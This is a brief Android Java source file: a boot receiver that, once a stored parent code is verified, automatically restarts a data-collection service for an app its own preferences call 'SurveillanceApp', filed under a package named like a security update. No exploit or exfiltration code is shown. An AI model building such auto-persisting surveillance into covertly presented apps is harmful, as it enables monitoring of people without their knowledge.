package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            String parentCode = prefs.getString("parent_code", "");
            boolean isVerified = prefs.getBoolean("code_verified", false);
            
            // RUDISHA SERVICE IKIWA PARENT CODE IMEWAKA
            if (!parentCode.isEmpty() && isVerified) {
                Intent serviceIntent = new Intent(context, DataCollectionService.class);
                context.startService(serviceIntent);
            }
        }
    }
}
